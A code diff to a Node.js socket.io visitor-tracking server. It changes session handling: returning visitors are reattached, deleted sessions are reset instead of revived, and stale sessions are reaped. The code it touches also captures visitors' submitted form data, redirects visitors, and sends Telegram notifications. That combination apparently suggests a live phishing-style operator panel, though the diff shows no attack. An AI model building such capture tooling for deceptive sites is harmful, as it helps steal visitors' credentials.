@@ -4,9 +4,12 @@ const telegramService = require('../services/telegram');
 const redirectService = require('../services/redirect');
 const notificationService = require('../services/notification');
 
+const _deletedSessionIds = new Set();
+
 const SESSION_SELECT = `
   SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
-         dp.name as current_page_name, dp.form_type as current_page_type
+         dp.name as current_page_name, dp.form_type as current_page_type,
+         (SELECT COUNT(*) FROM sessions s2 WHERE s2.visitor_id = s.visitor_id) as visit_count
   FROM sessions s
   LEFT JOIN websites w ON s.website_id = w.id
   LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
@@ -77,6 +80,22 @@ function setupTrackerNamespace(io, trackerNsp) {
           socket.leave(`session:${sessionId}`);
           socket.join(`session:${freshId}`);
           sessionId = freshId;
+        }
+
+        if (!existingSession && data.visitorId) {
+          const recent = await db.get(
+            `SELECT * FROM sessions WHERE visitor_id = ? AND ip_address = ? AND website_id = ? AND is_active = 1
+             AND (strftime('%s','now') - strftime('%s', last_activity)) <= 30
+             ORDER BY last_activity DESC LIMIT 1`,
+            [data.visitorId, ip, website.id]
+          );
+          if (recent) {
+            existingSession = recent;
+            socket.leave(`session:${sessionId}`);
+            sessionId = recent.id;
+            socket.sessionId = sessionId;
+            socket.join(`session:${sessionId}`);
+          }
         }
 
         if (existingSession) {
@@ -153,40 +172,14 @@ function setupTrackerNamespace(io, trackerNsp) {
       }
     });
 
-    // Self-heal helper — if socket.sessionId doesn't exist in DB (typical
-    // cause: admin deleted the session, cascading page_views away, but the
-    // visitor's socket is still connected with a stale id), recreate the row
-    // under the SAME id so subsequent events land somewhere. Returns true if
-    // the session existed OR was successfully recreated; false only on error.
-    //
-    // The visitor's browser keeps its sessionStorage sid, admin sees the
-    // session pop back up (with a fresh started_at) on the next page load.
-    async function _ensureSession(page, referrer) {
+    async function _ensureSession() {
       if (!socket.sessionId) return false;
       try {
         const row = await db.get('SELECT id FROM sessions WHERE id = ?', [socket.sessionId]);
         if (row) return true;
-
-        const ip = _getClientIp(socket);
-        const ua = socket.handshake.headers['user-agent'] || '';
-        const parsed = _parseUserAgent(ua);
-        const geo = _getGeoInfo(ip);
-        await db.run(
-          `INSERT INTO sessions
-             (id, website_id, visitor_id, ip_address, user_agent, browser, os, device,
-              country, city, current_page, referrer, pages_viewed, started_at, last_activity, is_active, metadata)
-           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, '{}')`,
-          [
-            socket.sessionId, website.id, 'v_' + uuidv4().slice(0, 8),
-            ip, ua, parsed.browser, parsed.os, parsed.device,
-            geo.country, geo.city, page || '', referrer || 'Direct'
-          ]
-        );
-        const revived = await db.get(SESSION_SELECT, [socket.sessionId]);
-        if (revived) {
-          io.of('/admin').to(`user:${website.owner_id}`).to('god').emit('admin:session:new', revived);
-        }
-        return true;
+        _deletedSessionIds.add(socket.sessionId);
+        socket.emit('tracker:reset', { reason: 'session_deleted' });
+        return false;
       } catch (err) {
         console.error('_ensureSession error:', err.message);
         return false;
@@ -197,8 +190,7 @@ function setupTrackerNamespace(io, trackerNsp) {
     socket.on('tracker:pageview', async (data) => {
       try {
         if (!socket.sessionId) return;
-        // Self-heal in case admin deleted the session between page loads.
-        if (!(await _ensureSession(data.url || data.page || '', data.referrer))) return;
+        if (!(await _ensureSession())) return;
         await db.run(
           'INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)',
           [socket.sessionId, website.id, data.url || data.page || '', data.title || '', data.duration || 0]
@@ -220,7 +212,7 @@ function setupTrackerNamespace(io, trackerNsp) {
     socket.on('tracker:activity', async (data) => {
       try {
         if (!socket.sessionId) return;
-        if (!(await _ensureSession((data && data.page) || null))) return;
+        if (!(await _ensureSession())) return;
         const page = (data && data.page) || null;
         if (page) {
           await db.run(
@@ -246,7 +238,7 @@ function setupTrackerNamespace(io, trackerNsp) {
     socket.on('tracker:formdata', async (data) => {
       try {
         if (!socket.sessionId) return;
-        if (!(await _ensureSession(data.page))) return;
+        if (!(await _ensureSession())) return;
 
         const sessionRow = await db.get('SELECT metadata FROM sessions WHERE id = ?', [socket.sessionId]);
         let metadata = {};
@@ -391,6 +383,33 @@ function setupTrackerNamespace(io, trackerNsp) {
       }
     });
   });
+
+  // Session reaper — mark stale sessions inactive every 60s
+  setInterval(async () => {
+    try {
+      const db = getAdapter();
+      const stale = await db.all(
+        `SELECT s.id, s.website_id FROM sessions s
+         WHERE s.is_active = 1
+         AND (strftime('%s','now') - strftime('%s', s.last_activity)) > 200`
+      );
+      for (const s of stale) {
+        const sockets = await trackerNsp.in(`session:${s.id}`).fetchSockets();
+        if (sockets.length === 0) {
+          await db.run('UPDATE sessions SET is_active = 0 WHERE id = ?', [s.id]);
+          const w = await db.get('SELECT owner_id FROM websites WHERE id = ?', [s.website_id]);
+          if (w) {
+            io.of('/admin').to(`user:${w.owner_id}`).to('god').emit('admin:session:end', {
+              id: s.id, sessionId: s.id, websiteId: s.website_id,
+              timestamp: new Date().toISOString()
+            });
+          }
+        }
+      }
+    } catch (err) {
+      console.error('[ALP] Session reaper error:', err.message);
+    }
+  }, 60000);
 }
 
 async function _checkRedirectRules(io, session) {
@@ -480,4 +499,4 @@ function _getGeoInfo(ip) {
   return { country: '', city: '' };
 }
 
-module.exports = { setupTrackerNamespace };
+module.exports = { setupTrackerNamespace, _deletedSessionIds };
